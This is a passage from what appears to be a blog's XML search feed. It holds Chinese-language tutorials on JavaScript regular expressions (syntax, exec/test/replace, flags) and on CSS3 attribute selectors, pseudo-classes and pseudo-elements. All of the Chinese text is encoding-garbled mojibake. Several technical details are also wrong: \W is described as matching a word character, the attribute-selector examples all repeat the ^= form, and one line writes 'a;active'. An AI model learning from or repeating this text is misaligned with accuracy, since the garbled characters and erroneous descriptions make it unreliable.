â€˜Tomâ€™ã€‚ä½†æ˜¯â€™Tomâ€˜å’Œâ€™Jackâ€˜éƒ½ä¸æ˜¯åŒ¹é…ç»“æžœçš„ä¸€éƒ¨åˆ† x(?ï¼y) åŒ¹é…â€™xâ€˜ä»…ä»…å½“â€™xâ€˜åŽé¢ä¸è·Ÿç€â€™yâ€˜,è¿™ä¸ªå«åšæ­£å‘å¦å®šæŸ¥æ‰¾ã€‚/\d+(?!\.)/åŒ¹é…ä¸€ä¸ªæ•°å­—ä»…ä»…å½“è¿™ä¸ªæ•°å­—åŽé¢æ²¡æœ‰è·Ÿå°æ•°ç‚¹çš„æ—¶å€™ã€‚ `x y` åŒ¹é…â€™xâ€˜æˆ–è€…â€™yâ€˜ã€‚ {n} næ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼ŒåŒ¹é…äº†å‰é¢ä¸€ä¸ªå­—ç¬¦åˆšå¥½å‘ç”Ÿäº† n æ¬¡ {n,m} n å’Œ m éƒ½æ˜¯æ•´æ•°ã€‚åŒ¹é…å‰é¢çš„å­—ç¬¦è‡³å°‘ n æ¬¡ï¼Œæœ€å¤š m æ¬¡ã€‚å¦‚æžœ n æˆ–è€… m çš„å€¼æ˜¯0ï¼Œè¿™ä¸ªå€¼ä¼šè¢«å¿½ç•¥ã€‚ [xyz] ä¸€ä¸ªå­—ç¬¦çš„é›†åˆã€‚åŒ¹é…æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬è½¬ä¹‰åºåˆ—ã€‚å¯ä»¥ç”¨ç ´æŠ˜å·ï¼ˆ-ï¼‰æ¥æŒ‡å®šä¸€ä¸ªå­—ç¬¦èŒƒå›´ã€‚å¯¹äºŽç‚¹ï¼ˆ.ï¼‰å’Œæ˜Ÿå·ï¼ˆ*ï¼‰è¿™æ ·çš„ç‰¹æ®Šç¬¦å·åœ¨ä¸€ä¸ªå­—ç¬¦é›†ä¸­æ²¡æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚ [^xyz] ä¸€ä¸ªåå‘å­—ç¬¦é›†ã€‚åŒ¹é…ä»»ä½•æ²¡æœ‰åŒ…å«åœ¨æ–¹æ‹¬å·ä¸­çš„å­—ç¬¦ã€‚åŒæ ·å¯ä»¥ä½¿ç”¨ç ´æŠ˜å·æ¥æŒ‡å®šä¸€ä¸ªå­—ç¬¦èŒƒå›´ã€‚ [\b] åŒ¹é…ä¸€ä¸ªé€€æ ¼(U+0008) \b åŒ¹é…ä¸€ä¸ªè¯çš„è¾¹ç•Œã€‚ä¸€ä¸ªè¯çš„è¾¹ç•Œå°±æ˜¯ä¸€ä¸ªè¯ä¸è¢«å¦å¤–ä¸€ä¸ªå­—å­—ç¬¦è·Ÿéšçš„ä½ç½®æˆ–è€…æ²¡æœ‰å…¶ä»–â€œå­—â€å­—ç¬¦åœ¨å…¶å‰é¢çš„ä½ç½®ã€‚ \B åŒ¹é…ä¸€ä¸ªéžå•è¯è¾¹ç•Œã€‚åŒ¹é…ä¸€ä¸ªå‰åŽå­—ç¬¦éƒ½æ˜¯ç›¸åŒç±»åž‹çš„ä½ç½®ã€‚éƒ½æ˜¯â€™å­—â€˜å­—ç¬¦æˆ–è€…éƒ½ä¸æ˜¯â€™å­—â€˜å­—ç¬¦ã€‚ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾éƒ½è¢«è®¤ä¸ºä¸æ˜¯â€˜å­—â€™å­—ç¬¦ï¼Œæˆ–è€…æ˜¯å­—ç¬¦ä¸²ã€‚ \cX å½“ X æ˜¯å¤„äºŽA åˆ° Z ä¹‹é—´çš„å­—ç¬¦çš„æ—¶å€™ï¼ŒåŒ¹é…å­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ªæŽ§åˆ¶ç¬¦ \d åŒ¹é…ä¸€ä¸ªæ•°å­— \D åŒ¹é…ä¸€ä¸ªéžæ•°å­—å­—ç¬¦ \f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ï¼ˆU+000Cï¼‰ \n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆU+000Aï¼‰ \r åŒ¹é…ä¸€ä¸ªå›žè½¦ç¬¦ï¼ˆU+000Dï¼‰ \s åŒ¹é…ä¸€ä¸ªç©ºç™½ç¬¦å·ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦å’Œæ¢è¡Œç¬¦ã€‚ç­‰ä»·äºŽ[\f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff] \S åŒ¹é…ä¸€ä¸ªéžç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äºŽ[^\f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]ã€‚ \t åŒ¹é…ä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆU+0009ï¼‰ \v åŒ¹é…ä¸€ä¸ªåž‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆU+000Bï¼‰ \w åŒ¹é…ä¸€ä¸ªå•å­—å­—ç¬¦ï¼ˆå­—æ¯ã€æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ï¼‰ç­‰ä»·äºŽ [A-Za-z0-9_] \W åŒ¹é…ä¸€ä¸ªå•å­—å­—ç¬¦ç­‰ä»·äºŽ [^A-Za-z0-9_] \n åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå®ƒè¿”å›žæœ€åŽçš„ç¬¬ n ä¸ªå­æ•èŽ·åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼ˆæ•èŽ·çš„æ•°ç›®ä»¥å·¦æ‹¬å·è®¡æ•°ï¼‰ \0 åŒ¹é… NULL(U+0000)å­—ç¬¦ï¼Œä¸è¦åœ¨è¿™åŽé¢è·Ÿç€å…¶ä»–å°æ•°ï¼Œå› ä¸º \0&lt;digits&gt;æ˜¯ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰åºåˆ— \xhh ä¸Žä»£ç  hh åŒ¹é…å­—ç¬¦ï¼ˆä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼‰ \uhhhh ä¸Žä»£ç  hhhhåŒ¹é…å­—ç¬¦ï¼ˆå››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼‰ ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ­£åˆ™è¡¨è¾¾å¼è¢«ç”¨äºŽ RegExp çš„ exec å’Œ test æ–¹æ³•ï¼Œè¿˜æœ‰ String çš„ matchã€replaceã€searchå’Œ split æ–¹æ³•ã€‚ æ–¹æ³• æè¿° exec ä¸€ä¸ªåœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡ŒæŸ¥æ‰¾åŒ¹é…çš„ RegExp æ–¹æ³•ï¼Œå®ƒè¿”å›žä¸€ä¸ªæ•°ç»„(æœªåŒ¹é…è¿”å›ž null) test ä¸€ä¸ªåœ¨å­—ç¬¦ä¸²ä¸­æµ‹è¯•æ˜¯å¦åŒ¹é…çš„ RegExp æ–¹æ³•ï¼Œå®ƒè¿”å›ž true æˆ–è€… false match ä¸€ä¸ªåœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡ŒæŸ¥æ‰¾åŒ¹é…çš„ String æ–¹æ³•ï¼Œå®ƒè¿”å›žä¸€ä¸ªæ•°ç»„æˆ–è€…åœ¨æœªåŒ¹é…æ—¶è¿”å›ž null search ä¸€ä¸ªåœ¨å­—ç¬¦ä¸²ä¸­æµ‹è¯•åŒ¹é…çš„ String æ–¹æ³•ï¼Œå®ƒè¿”å›žåŒ¹é…åˆ°çš„ä½ç½®ç´¢å¼•ï¼Œæˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å›ž -1 replace ä¸€ä¸ªåœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡ŒæŸ¥æ‰¾åŒ¹é…çš„ String æ–¹æ³•ï¼Œå¹¶ä¸”ä½¿ç”¨æ›¿æ¢å­—ç¬¦ä¸²æ›¿æ¢æŽ‰åŽé¢çš„å­å­—ç¬¦ä¸² split ä¸€ä¸ªä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ–è€…ä¸€ä¸ªå›ºå®šå­—ç¬¦ä¸²åˆ†éš”ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å°†åˆ†éš”åŽçš„å­—ç¬¦ä¸²å­˜å‚¨åˆ°æ•°ç»„ä¸­çš„ String æ–¹æ³• ä¾‹å­ï¼š 12345678910111213141516171819// è„šæœ¬ä½¿ç”¨ exec æ–¹æ³•åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä¸€ä¸ªåŒ¹é…let reg = /d(b+)d/g;/**regå‚æ•°* 5 lastIndex ä¸‹ä¸€ä¸ªåŒ¹é…çš„ç´¢å¼•å€¼* "d(b+)d" source æ¨¡å¼æ–‡æœ¬ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼åˆ›å»ºæ—¶æ›´æ–°ï¼Œä¸æ‰§è¡Œ*/let myArray = reg.exec("cdbbdbsbz")myArray; // ["dbbd", "bb", index: 1, input: "cdbbdbsbz", groups: undefined]/** myArrayå‚æ•°* ["dbbd,bb"] åŒ¹é…åˆ°çš„å­—ç¬¦å’Œæ‰€æœ‰è¢«è®°ä½çš„å­å­—ç¬¦ä¸²* 1 1input åˆå§‹å­—ç¬¦ä¸²* input:cdbbdbsbz åˆå§‹å­—ç¬¦ä¸²*/// ä¸éœ€è¦è®¿é—®æ­£åˆ™è¡¨è¾¾å¼çš„å±žæ€§ï¼Œé€šè¿‡å¦ä¸€ä¸ªæ–¹æ³•æ¥åˆ›å»ºmyArray = /d(b+)d/g.exec("cdbbdbsbz")// é€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²æž„å»ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹å¼reg = new RegExp("d(b+)d","g");myArray = reg.exec("cdbbdbsbz") ä½¿ç”¨æ‹¬å·çš„å­å­—ç¬¦ä¸²åŒ¹é…ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä½¿ç”¨æ‹¬å·ï¼Œå°†å¯¼è‡´ç›¸åº”çš„å­åŒ¹é…è¢«è®°ä½ã€‚ä½¿ç”¨æ‹¬å·åŒ¹é…çš„å­å­—ç¬¦ä¸²çš„æ•°é‡æ˜¯æ— é™çš„ã€‚è¿”å›žçš„æ•°ç»„ä¸­ä¿å­˜æ‰€æœ‰è¢«å‘çŽ°çš„å­åŒ¹é…ã€‚ 1234let reg = /(\w+)\s(\w+)/;let str = 'John Smith';let newStr = str.replace(reg,"$2,$1")newStr; // "Smith,John" é€šè¿‡æ ‡å¿—è¿›è¡Œé«˜çº§æœç´¢æ­£åˆ™è¡¨è¾¾å¼æœ‰å››ä¸ªå¯é€‰å‚æ•°è¿›è¡Œå…¨å±€å’Œä¸åŒºåˆ†å¤§å°å†™æœç´¢ï¼Œè¿™äº›å‚æ•°å¯ä»¥å•ç‹¬ä½¿ç”¨ä¹Ÿå¯ä»¥ä¸€èµ·ä½¿ç”¨åœ¨ä»»ä½•é¡ºåºå’ŒåŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†ä¸­ã€‚ æ ‡å¿— æè¿° g å…¨å±€æœç´¢ i ä¸åŒºåˆ†å¤§å°å†™æœç´¢ m å¤šè¡Œæœç´¢(ä½¿ç”¨è¯¥æ ‡å¿—ï¼Œ^å’Œ $åŒ¹é…çš„å¼€å§‹æˆ–è€…ç»“æŸè¾“å…¥å­—ç¬¦ä¸²çš„) y æ‰§è¡Œâ€œç²˜æ€§â€æœç´¢ï¼ŒåŒ¹é…ä»Žç›®æ ‡å­—ç¬¦ä¸²çš„å½“å‰ä½ç½®å¼€å§‹ï¼Œå¯ä»¥ä½¿ç”¨ yæ ‡å¿— æ ¼å¼ï¼š 12345let reg = /pattern/flags;let reg = /\w+\s/g;// æˆ–è€…reg = new RegExp("pattern","flags")reg = new RegExp("\\w+\\s","g")]]></content>
      <categories>
        <category>æ­£åˆ™è¡¨è¾¾å¼</category>
      </categories>
      <tags>
        <tag>æ­£åˆ™è¡¨è¾¾å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¢è¯•å®˜é—®æˆ‘HTML5æ˜¯ä»€ä¹ˆï¼ˆä¸‹ï¼‰]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[CSS3å‘å±•åŽ†å² 1CSS1 -&gt; CSS2 -&gt; CSS2.1 -&gt;CSS3 æ¨¡å—ä¸Žæ¨¡å—åŒ–ç»“æž„ CSS3é‡‡ç”¨äº†åˆ†å·¥åä½œçš„æ¨¡å—åŒ–ç»“æž„ å…¶ä¸­æœ€é‡è¦çš„ CSS3 æ¨¡å—åŒ…æ‹¬ï¼š é€‰æ‹©å™¨ æ¡†æ¨¡åž‹ èƒŒæ™¯å’Œè¾¹æ¡† æ–‡æœ¬æ•ˆæžœ 2D/3D è½¬æ¢ åŠ¨ç”» å¤šåˆ—å¸ƒå±€ ç”¨æˆ·ç•Œé¢ CSS3 æ–°å¢žçš„é€‰æ‹©å™¨å±žæ€§é€‰æ‹©å™¨ é€‰æ‹©å™¨ å«ä¹‰ å®žä¾‹ E[att^=â€valâ€] å±žæ€§ attçš„å€¼ä»¥ valå¼€å¤´çš„å…ƒç´  div[id^=&#39;haha&#39;] E[att$=â€valâ€] å±žæ€§ attçš„å€¼ä»¥ valç»“å°¾çš„å…ƒç´  div[id^=&#39;haha&#39;] E[att=â€valâ€] å±žæ€§ attçš„å€¼åŒ…å« valå­—ç¬¦ä¸²çš„å…ƒç´  div[id^=&#39;haha&#39;] ç»“æž„æ€§ä¼ªç±»é€‰æ‹©å™¨ é€‰æ‹©å™¨ å«ä¹‰ å®žä¾‹ E:root åŒ¹é…æ–‡æ¡£çš„æ ¹å…ƒç´ ï¼Œå¯¹äºŽ HTML æ–‡æ¡£å°±æ˜¯ HTMLå…ƒç´  E:not(s) åŒ¹é…ä¸ç¬¦åˆå½“å‰é€‰æ‹©å™¨çš„ä»»ä½•å…ƒç´  div:not([class=&quot;demo&quot;]):é™¤äº†classä¸ºdemoçš„divä»¥å¤– E:empty åŒ¹é…ä¸€ä¸ªä¸åŒ…å«ä»»ä½•å­å…ƒç´ çš„å…ƒç´ ï¼ˆæ–‡æœ¬èŠ‚ç‚¹ä¹Ÿè¢«çœ‹æˆå­å…ƒç´ ï¼Œç©ºæ ¼ä¹Ÿæ˜¯ä¸€ä¸ªå…ƒç´ ï¼‰ E:target åŒ¹é…è¢« location.hashé€‰ä¸­çš„å…ƒç´ ï¼ˆå³é”šç‚¹å…ƒç´ ï¼‰ï¼Œé€‰æ‹©å™¨å¯ä»¥ç”¨æ¥é€‰å–å½“å‰æ´»åŠ¨çš„ç›®æ ‡å…ƒç´  E:first-child åŒ¹é…Eçˆ¶å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ ,å¦‚æžœå½“å‰ä½ç½®å…ƒç´ ä¸æ˜¯å‰é¢æ‰€ä¿®é¥°çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ— æ•ˆ li:first-child:åŒ¹é…é¡µé¢ä¸­æ‰€æœ‰ç¬¬ä¸€ä¸ªli E:last-child åŒ¹é…Eçˆ¶å…ƒç´ çš„æœ€åŽä¸€ä¸ªå­å…ƒç´ ï¼Œç­‰åŒäºŽ E:nth-last-child(1),å¦‚æžœå½“å‰ä½ç½®å…ƒç´ ä¸æ˜¯å‰é¢æ‰€ä¿®é¥°çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ— æ•ˆ E:nth-child(n) åŒ¹é…Eçˆ¶å…ƒç´ çš„ç¬¬nä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªç¼–å·ä¸º1,å¦‚æžœå½“å‰ä½ç½®å…ƒç´ ä¸æ˜¯å‰é¢æ‰€ä¿®é¥°çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ— æ•ˆ E:nthâ€“last-child(n) åŒ¹é…Eçˆ¶å…ƒç´ çš„å€’æ•°ç¬¬nä¸ªå­å…ƒç´ ï¼Œç¬¬ä¸€ä¸ªç¼–å·ä¸º1,å¦‚æžœå½“å‰ä½ç½®å…ƒç´ ä¸æ˜¯å‰é¢æ‰€ä¿®é¥°çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ— æ•ˆ E:nth-of-type(n) ä¸ŽE:nth-child()ç±»ä¼¼ï¼Œä½†æ˜¯ä»…åŒ¹é…ä½¿ç”¨åŒç§æ ‡ç­¾çš„å…ƒç´  p:nth-of-type(2):åŒ¹é…çˆ¶å…ƒç´ çš„ç¬¬2ä¸ªå­å…ƒç´ p E:first-of-type(n) åŒ¹é…çˆ¶å…ƒç´ ä½¿ç”¨åŒç§æ ‡ç­¾çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ ï¼Œç­‰åŒäºŽ E:nth-of-type(1) E:last-of-type(n) åŒ¹é…çˆ¶å…ƒç´ ä½¿ç”¨åŒç§æ ‡ç­¾çš„æœ€åŽä¸€ä¸ªå­å…ƒç´ ï¼Œç­‰åŒäºŽ E:nth-last-of-type(1) E:nth-last-of-type(n) ä¸Ž E:nth-last-child(n)ç±»ä¼¼ï¼Œä½†æ˜¯ä»…åŒ¹é…ä½¿ç”¨ç›¸åŒæ ‡ç­¾çš„å…ƒç´  E:only-child åŒ¹é…çˆ¶å…ƒç´ ä¸‹ä»…æœ‰çš„ä¸€ä¸ªå­å…ƒç´ ï¼Œç­‰åŒäºŽ E:first-child:last-childæˆ–è€… E:nth-child(1):nth-last-child(1) Eï¼šonly-of-type åŒ¹é…çˆ¶å…ƒç´ ä¸‹ä½¿ç”¨åŒç§æ ‡ç­¾çš„å”¯ä¸€ä¸€ä¸ªå­å…ƒç´ ï¼Œç­‰åŒäºŽ E:first-of-type:last-of-typeæˆ–è€… E:nth-of-type(1):nth-last-of-type(1) å¤‡æ³¨ï¼š né‡Œé¢å¯ä»¥æ˜¯ odd(å¥‡æ•°)ã€even(å¶æ•°) å¾ªçŽ¯ä½¿ç”¨æ ·å¼ï¼šli:nth-child(2n+1) UIçŠ¶æ€ä¼ªç±»é€‰æ‹©å™¨ é€‰æ‹©å™¨ å«ä¹‰ å®žä¾‹ E:enabled åŒ¹é…è¡¨å•ä¸­æ¿€æ´»çš„å…ƒç´  E:disabled åŒ¹é…è¡¨å•ä¸­ç¦ç”¨çš„å…ƒç´  E:checked åŒ¹é…è¡¨å•ä¸­è¢«é€‰ä¸­çš„å•é€‰æ¡†æˆ–è€…å¤é€‰æ¡† E::selection åŒ¹é…ç”¨æˆ·ç”¨é¼ æ ‡å½“å‰é€‰ä¸­çš„å…ƒç´  user-select: none;å–æ¶ˆé¼ æ ‡é€‰ä¸­çš„é»˜è®¤æ ·å¼ E:read-only åŒ¹é…é€‰ä¸­åªè¯»çš„å…ƒç´  &lt;input type=&quot;text&quot; readonly=&quot;readonly&quot; value=&quot;hahha&quot;/&gt; E:read-write åŒ¹é…é€‰ä¸­éžåªè¯»çš„å…ƒç´  &lt;input type=&quot;text&quot; value=&quot;hahha&quot;/&gt; çº§å…ƒç´ é€šç”¨é€‰æ‹©å™¨ é€‰æ‹©å™¨ å«ä¹‰ å®žä¾‹ E~F åŒ¹é…ä»»ä½•åœ¨ Eå…ƒç´ ä¹‹åŽçš„åŒçº§å…ƒç´  F p~ul{background:#ff9;} Eï¼šhover Eï¼šactive Eï¼šfocus Eï¼šenabled Eï¼šdisabled Eï¼šread-only Eï¼šread-write Eï¼šchecked Eï¼šdefault Eï¼šindeterminate Eï¼šselection å±žæ€§é€‰æ‹©å™¨ ç®€å•å±žæ€§é€‰æ‹© 12345678/*æŠŠåŒ…å«æŸä¸ªattributeçš„æ‰€æœ‰è¾¹å…ƒç´ å˜æˆçº¢è‰²*/*[attribute]&#123;color:red&#125;/*åªå¯¹æœ‰attributeå±žæ€§çš„divå…ƒç´ åº”ç”¨æ ·å¼*/div[attribute]&#123;color:red&#125;/*æ ¹æ®å¤šä¸ªå±žæ€§ï¼ŒåŒæ—¶æ‹¥æœ‰attribute1å’Œattribute2çš„å…ƒdivåº”ç”¨æ ·å¼*/div[attribute1][attribute2]&#123;color:red&#125;/*å¯¹æœ‰altå±žæ€§çš„å›¾åƒ*/img[alt]&#123;border:5px solid red&#125; æ ¹æ®å…·ä½“å±žæ€§é€‰æ‹© 123456/*æŸä¸ªå…·ä½“çš„aæ ‡ç­¾*/a[href="http://laibh.top"]&#123;color:red&#125;;/*åŠ å¤šä¸€ä¸ªé™åˆ¶*/a[href="http://laibh.top"][title="èµ–åŒå­¦"]&#123;color:red&#125;;/*ä¸è¦å¿½ç•¥ç©ºæ ¼*/p[class="red small"]&#123;color:red&#125;; æ ¹æ®éƒ¨åˆ†å±žæ€§å€¼é€‰æ‹© 12/*é€‰æ‹© classå±žæ€§ä¸­åŒ…å« importantå…ƒç´ çš„ */p[class~="important"]&#123;color:red&#125; ç±»åž‹ æè¿° [abc^=â€defâ€] é€‰æ‹© abc å±žæ€§å€¼ä»¥ â€œdefâ€ å¼€å¤´çš„æ‰€æœ‰å…ƒç´  [abc$=â€defâ€] é€‰æ‹© abc å±žæ€§å€¼ä»¥ â€œdefâ€ ç»“å°¾çš„æ‰€æœ‰å…ƒç´  [abc*=â€defâ€] é€‰æ‹© abc å±žæ€§å€¼ä¸­åŒ…å«å­ä¸² â€œdefâ€ çš„æ‰€æœ‰å…ƒç´  ç‰¹å®šå±žæ€§é€‰æ‹©ç±»åž‹ 12/*è¿™ä¸ªè§„åˆ™ä¼šé€‰æ‹© lang å±žæ€§ç­‰äºŽ en æˆ–ä»¥ en- å¼€å¤´çš„æ‰€æœ‰å…ƒç´ */*[lang|="en"]&#123;color:red&#125; csså±žæ€§é€‰æ‹©å™¨è¡¨ é€‰æ‹©å™¨ æè¿° [attribute] ç”¨äºŽé€‰å–å¸¦æœ‰æŒ‡å®šå±žæ€§çš„å…ƒç´ ã€‚ [attribute=value] ç”¨äºŽé€‰å–å¸¦æœ‰æŒ‡å®šå±žæ€§å’Œå€¼çš„å…ƒç´ ã€‚ [attribute~=value] ç”¨äºŽé€‰å–å±žæ€§å€¼ä¸­åŒ…å«æŒ‡å®šè¯æ±‡çš„å…ƒç´ ã€‚ [attribute\ =value] ç”¨äºŽé€‰å–å¸¦æœ‰ä»¥æŒ‡å®šå€¼å¼€å¤´çš„å±žæ€§å€¼çš„å…ƒç´ ï¼Œè¯¥å€¼å¿…é¡»æ˜¯æ•´ä¸ªå•è¯ã€‚ [attribute^=value] åŒ¹é…å±žæ€§å€¼ä»¥æŒ‡å®šå€¼å¼€å¤´çš„æ¯ä¸ªå…ƒç´ ã€‚ï¼ˆCSS3æ–°å¢žï¼‰ [attribute$=value] åŒ¹é…å±žæ€§å€¼ä»¥æŒ‡å®šå€¼ç»“å°¾çš„æ¯ä¸ªå…ƒç´ ã€‚ï¼ˆCSS3æ–°å¢žï¼‰ [attribute**=value*] åŒ¹é…å±žæ€§å€¼ä¸­åŒ…å«æŒ‡å®šå€¼çš„æ¯ä¸ªå…ƒç´ ã€‚ï¼ˆCSS3æ–°å¢žï¼‰ ä¼ªç±»ä¸Žä¼ªå…ƒç´ ä¼ªç±»CSS2å®šä¹‰ï¼šç”¨äºŽå‘æŸäº›é€‰æ‹©å™¨æ·»åŠ ç‰¹æ®Šçš„æ•ˆæžœã€‚ CSS3å®šä¹‰ï¼š ä¼ªç±»çš„å­˜åœ¨æ˜¯ä¸ºäº†é€šè¿‡é€‰æ‹©å™¨æ‰¾åˆ°é‚£äº›ä¸å­˜äºŽDOMæ ‘ä¸­çš„ä¿¡æ¯ä»¥åŠä¸èƒ½è¢«å¸¸è§„ CSSé€‰æ‹©å™¨èŽ·å–åˆ°çš„ä¿¡æ¯ï¼ˆ:targetï¼‰ ä¼ªç±»ç”±ä¸€ä¸ªå†’å·:å¼€å¤´ï¼Œå†’å·åŽé¢æ˜¯ä¼ªç±»çš„åç§°å’ŒåŒ…å«åœ¨åœ†æ‹¬å·ä¸­çš„å¯é€‰å‚æ•° ä»»ä½•å¸¸è§„é€‰æ‹©å™¨éƒ½å¯ä»¥åœ¨ä»»ä½•ä½ç½®ä½¿ç”¨ä¼ªç±»ã€‚ä¼ªç±»è¯­æ³•ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¸€äº›ä¼ªç±»çš„ä½œç”¨ä¼šäº’æ–¥ï¼Œå¦å¤–ä¸€äº›ä¼ªç±»å¯ä»¥åŒæ—¶è¢«åŒä¸€ä¸ªå…ƒç´ ä½¿ç”¨ã€‚å¹¶ä¸”ï¼Œä¸ºäº†æ»¡è¶³ç”¨æˆ·åœ¨æ“ä½œ DOMæ—¶äº§ç”Ÿçš„ DOM ç»“æž„å˜åŒ–ï¼Œä¼ªç±»ä¹Ÿå¯ä»¥æ˜¯åŠ¨æ€çš„ 12selector : pseudo-class&#123; property:value &#125;selector.class : pseudo-class&#123; property:value &#125; é”šä¼ªç±»ï¼ˆä¸å­˜åœ¨äºŽ DOMæ ‘çš„ä¿¡æ¯ï¼‰ 1234a:link&#123;&#125;a:visited&#123;&#125;a:hover&#123;&#125;a;active&#123;&#125; 123456789101112131415161718&lt;style&gt;.tab_content &#123; height: 800px; background: red; margin-bottom: 100px;&#125;#tab1:target, #tab2:target, #tab3:target &#123; background:blue;&#125; &lt;/style&gt;&lt;div id="tab1" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;div id="tab2" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;div id="tab3" class="tab_content"&gt;&lt;!--tabed content--&gt;&lt;/div&gt;&lt;!--:targeté€šè¿‡CSSå®žçŽ°äº†å¸¸è§„CSSæ— æ³•å®žçŽ°çš„é€»è¾‘--&gt; ä¼ªç±»è¡¨ å±žæ€§ æè¿° CSS :active å‘è¢«æ¿€æ´»çš„å…ƒç´ æ·»åŠ æ ·å¼ã€‚ 1 :focus å‘æ‹¥æœ‰é”®ç›˜è¾“å…¥ç„¦ç‚¹çš„å…ƒç´ æ·»åŠ æ ·å¼ã€‚ 2 :hover å½“é¼ æ ‡æ‚¬æµ®åœ¨å…ƒç´ ä¸Šæ–¹æ—¶ï¼Œå‘å…ƒç´ æ·»åŠ æ ·å¼ã€‚ 1 :link å‘æœªè¢«è®¿é—®çš„é“¾æŽ¥æ·»åŠ æ ·å¼ã€‚ 1 :visited å‘å·²è¢«è®¿é—®çš„é“¾æŽ¥æ·»åŠ æ ·å¼ã€‚ 1 :first-child å‘å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ æ·»åŠ æ ·å¼ã€‚ 2 :lang å‘å¸¦æœ‰æŒ‡å®š lang å±žæ€§çš„å…ƒç´ æ·»åŠ æ ·å¼ã€‚ 2 ä¼ªå…ƒç´ CSS2å®šä¹‰ï¼šç”¨äºŽå‘æŸäº›é€‰æ‹©å™¨è®¾ç½®ç‰¹æ®Šæ•ˆæžœ CSS3å®šä¹‰ï¼š ä¼ªå…ƒç´ åœ¨DOMæ ‘ä¸­åˆ›å»ºäº†ä¸€äº›æŠ½è±¡å…ƒç´ ï¼Œè¿™äº›æŠ½è±¡å…ƒç´ æ˜¯ä¸å­˜åœ¨æ–‡æ¡£è¯­è¨€é‡Œé¢çš„ï¼ˆhtmlæºç ï¼‰ã€‚å¦‚ï¼šdocumentæŽ¥å£ä¸æä¾›è®¿é—®å…ƒç´ å†…å®¹çš„ç¬¬ä¸€ä¸ªå­—æˆ–è€…ç¬¬ä¸€è¡Œçš„æœºåˆ¶ï¼Œè€Œä¼ªå…ƒç´ å¯ä»¥ä½¿å¾—å¼€å‘è€…æå–åˆ°è¿™äº›ä¿¡æ¯ã€‚å¹¶ä¸”ï¼Œä¸€äº›ä¼ªå…ƒç´ å¯ä»¥ä½¿å¼€å‘è€…èŽ·å–åˆ°ä¸å­˜åœ¨ä¸Žæºæ–‡æ¡£ä¸­çš„å†…å®¹ï¼ˆ:before/:afterï¼‰ ä¼ªå…ƒç´ ç”±ä¸¤ä¸ªå†’å·:ï¼šå¼€å¤´ï¼Œç„¶åŽæ˜¯ä¼ªå…ƒç´ çš„åç§° ä½¿ç”¨::æ˜¯ä¸ºäº†åŒºåˆ†ä¼ªç±»å’Œä¼ªå…ƒç´ ï¼ˆCSS2ä¸­æ²¡æœ‰åŒºåˆ«ï¼‰ã€‚è€ƒè™‘å…¼å®¹æ€§çš„è¯ï¼ŒCSS2ä¸­çš„å·²å­˜ä¼ªå…ƒç´ å¯ä»¥ä½¿ç”¨ :ï¼Œä½†æ˜¯ CSS3çš„å°±è¦ä½¿ç”¨ :: ä¸€ä¸ªé€‰æ‹©å™¨åªèƒ½ä½¿ç”¨ä¸€ä¸ªä¼ªå…ƒç´ ï¼Œå¹¶ä¸”ä¼ªå…ƒç´ å¿…é¡»å¤„äºŽé€‰æ‹©å™¨è¯­å¥çš„æœ€åŽ 12selector:pseudo-element&#123;property:value&#125;selector.class:pseudo-element&#123;property:value&#125; :first-line ç”¨äºŽå‘æ–‡æœ¬çš„é¦–è¡Œè®¾ç½®ç‰¹æ®Šæ ·å¼(åªèƒ½ç”¨äºŽå—çº§å…ƒç´ ) 